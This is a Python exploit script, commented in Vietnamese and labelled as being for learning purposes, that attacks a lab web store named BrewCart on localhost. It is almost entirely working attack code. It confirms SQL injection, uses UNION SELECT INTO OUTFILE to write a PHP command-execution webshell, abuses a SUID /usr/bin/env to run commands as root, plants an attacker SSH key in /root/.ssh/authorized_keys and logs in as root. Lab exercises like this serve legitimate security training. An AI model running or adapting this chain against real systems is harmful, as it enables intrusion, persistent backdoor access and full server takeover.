#!/usr/bin/env python3
"""
BrewCart Lab — Full exploit chain
SQLi → Webshell → SUID env → SSH key → Root SSH

FIX: Dùng base64 thay xxd (container không có xxd).

CHỈ DÙNG CHO MỤC ĐÍCH HỌC TẬP.
"""

import argparse
import base64
import os
import re
import subprocess
import sys
from pathlib import Path

import requests


# ============================================================
# CẤU HÌNH
# ============================================================
DEFAULT_BASE        = "http://localhost:3000"
DEFAULT_SSH_PORT    = 2022

REMOTE_SHELL_MYSQL  = "/app/uploads/shell3.py.php"
SHELL_URL_PATH      = "/uploads/shell3.py.php"

REMOTE_TMP_KEY      = "/tmp/k.pub"
REMOTE_ROOT_KEY     = "/root/.ssh/authorized_keys"

LOCAL_KEY           = "./lab_key"
LOCAL_KEY_PUB       = "./lab_key.pub"


# ============================================================
# LOG
# ============================================================
def log(step, msg):
    print(f"[{step}] {msg}")


def err(msg):
    print(f"[!] {msg}", file=sys.stderr)


def ok(msg):
    print(f"[+] {msg}")


# ============================================================
# BƯỚC 1 — XÁC NHẬN SQLi
# ============================================================
def confirm_sqli(base):
    log("1", "Xác nhận SQLi ở /product?id=")
    r = requests.get(f"{base}/product", params={"id": "1'"}, timeout=10)
    if any(m in r.text for m in ["SQL syntax", "SQLSTATE", "MariaDB"]):
        ok("Endpoint dính SQLi")
        return True
    err("Không thấy lỗi SQL")
    return False


# ============================================================
# BƯỚC 2 — GHI WEBSHELL QUA SQLi
# ============================================================
def write_webshell(base):
    log("2", "Ghi webshell PHP qua SQLi")

    php = '<?php system($_REQUEST["cmd"]); ?>'
    hex_php = "0x" + php.encode().hex()

    payload = (
        f"-1 UNION SELECT {hex_php},'','','' "
        f"INTO OUTFILE '{REMOTE_SHELL_MYSQL}'-- -"
    )

    r = requests.get(f"{base}/product", params={"id": payload}, timeout=10)

    if any(m in r.text for m in ["SQL syntax", "Errcode", "already exists"]):
        err("Ghi shell thất bại")
        m = re.search(r"SQLSTATE.{0,200}", r.text)
        if m:
            err(m.group(0))
        return False

    ok(f"Shell ghi thành công: {SHELL_URL_PATH}")
    return True


# ============================================================
# BƯỚC 3 — VERIFY WEBSHELL
# ============================================================
def verify_webshell(base):
    log("3", "Verify webshell")
    r = requests.post(
        f"{base}{SHELL_URL_PATH}",
        data={"cmd": "id"},
        timeout=10,
    )
    if "uid=" in r.text:
        ok(f"Webshell chạy: {r.text.strip()}")
        return True
    err(f"Webshell không chạy: {r.text[:200]}")
    return False


# ============================================================
# BƯỚC 4 — CHECK SUID ENV
# ============================================================
def check_suid_env(base):
    log("4", "Kiểm tra SUID /usr/bin/env")
    r = requests.post(
        f"{base}{SHELL_URL_PATH}",
        data={"cmd": "/usr/bin/env id"},
        timeout=10,
    )
    if "euid=0(root)" in r.text:
        ok("SUID env hoạt động — euid=0")
        return True
    err(f"SUID env không hoạt động: {r.text.strip()}")
    return False


# ============================================================
# BƯỚC 5 — TẠO SSH KEYPAIR
# ============================================================
def ensure_keypair():
    log("5", "Tạo SSH keypair")

    if Path(LOCAL_KEY).exists() and Path(LOCAL_KEY_PUB).exists():
        ok(f"Keypair đã tồn tại: {LOCAL_KEY}")
    else:
        log("5", f"Tạo mới: {LOCAL_KEY}")
        subprocess.run(
            ["ssh-keygen", "-t", "rsa", "-b", "2048",
             "-f", LOCAL_KEY, "-N", ""],
            check=True,
            stdout=subprocess.DEVNULL,
        )

    pubkey = Path(LOCAL_KEY_PUB).read_text().strip()
    log("5", f"Public key length: {len(pubkey)}")
    return pubkey


# ============================================================
# BƯỚC 6 — GHI KEY VÀO /tmp/k.pub QUA BASE64
# ============================================================
def write_key_to_tmp(base, pubkey):
    log("6", "Ghi key vào /tmp/k.pub (dùng base64)")

    # Xóa file cũ
    requests.post(
        f"{base}{SHELL_URL_PATH}",
        data={"cmd": f"/usr/bin/env rm -f {REMOTE_TMP_KEY}"},
        timeout=10,
    )

    # Base64 encode
    b64_key = base64.b64encode(pubkey.encode()).decode()
    log("6", f"BASE64 length: {len(b64_key)}")

    # Ghi qua base64 -d
    cmd = f"sh -c \"echo '{b64_key}' | base64 -d > {REMOTE_TMP_KEY}\""
    requests.post(
        f"{base}{SHELL_URL_PATH}",
        data={"cmd": cmd},
        timeout=10,
    )

    # Verify
    r = requests.post(
        f"{base}{SHELL_URL_PATH}",
        data={"cmd": f"cat {REMOTE_TMP_KEY}"},
        timeout=10,
    )

    written = r.text.strip()

    # Debug: in ra nếu không khớp
    if written != pubkey:
        err("Key KHÔNG khớp")
        err(f"Expected: {len(pubkey)} chars")
        err(f"Got:      {len(written)} chars")
        err(f"Expected first 60: {pubkey[:60]}")
        err(f"Got first 60:      {written[:60]}")
        return False

    ok("Key ghi vào /tmp/k.pub đúng 100%")
    return True


# ============================================================
# BƯỚC 7 — COPY KEY VÀO /root/.ssh/
# ============================================================
def install_root_key(base):
    log("7", "Copy key vào /root/.ssh/authorized_keys")

    # Xóa key cũ
    requests.post(
        f"{base}{SHELL_URL_PATH}",
        data={"cmd": f"/usr/bin/env rm -f {REMOTE_ROOT_KEY}"},
        timeout=10,
    )

    # Copy qua env install
    requests.post(
        f"{base}{SHELL_URL_PATH}",
        data={"cmd": f"/usr/bin/env install -D -m 600 {REMOTE_TMP_KEY} {REMOTE_ROOT_KEY}"},
        timeout=10,
    )

    # Verify
    r = requests.post(
        f"{base}{SHELL_URL_PATH}",
        data={"cmd": f"/usr/bin/env cat {REMOTE_ROOT_KEY}"},
        timeout=10,
    )

    if "ssh-rsa" in r.text:
        ok("Key đã nằm trong /root/.ssh/authorized_keys")
        return True
    err(f"Key không vào được /root/: {r.text[:200]}")
    return False


# ============================================================
# BƯỚC 8 — SSH VÀO ROOT
# ============================================================
def ssh_root(ssh_port):
    log("8", f"SSH vào root@localhost:{ssh_port}")

    subprocess.run(
        ["ssh-keygen", "-R", f"[localhost]:{ssh_port}"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    cmd = [
        "ssh",
        "-i", LOCAL_KEY,
        "-p", str(ssh_port),
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "BatchMode=yes",
        "root@localhost",
        "id; hostname; whoami",
    ]
    r = subprocess.run(cmd, capture_output=True, text=True)

    if r.returncode != 0:
        err(f"SSH thất bại: {r.stderr.strip()}")
        return False

    ok("SSH thành công!")
    print("=" * 60)
    print(r.stdout.strip())
    print("=" * 60)
    return True


# ============================================================
# MAIN
# ============================================================
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument("--ssh-port", type=int, default=DEFAULT_SSH_PORT)
    parser.add_argument("--no-ssh", action="store_true")
    args = parser.parse_args()

    print("=" * 60)
    print(" BREWCART LAB — FULL EXPLOIT CHAIN")
    print(" SQLi → Webshell → SUID → SSH Root")
    print(" CHỈ DÙNG CHO MỤC ĐÍCH HỌC TẬP")
    print("=" * 60)

    if not confirm_sqli(args.base):
        sys.exit(1)

    if not write_webshell(args.base):
        sys.exit(1)

    if not verify_webshell(args.base):
        sys.exit(1)

    if not check_suid_env(args.base):
        sys.exit(1)

    pubkey = ensure_keypair()

    if not write_key_to_tmp(args.base, pubkey):
        sys.exit(1)

    if not install_root_key(args.base):
        sys.exit(1)

    if not args.no_ssh:
        if not ssh_root(args.ssh_port):
            sys.exit(1)

    print("\n✅ HOÀN THÀNH")


if __name__ == "__main__":
    main()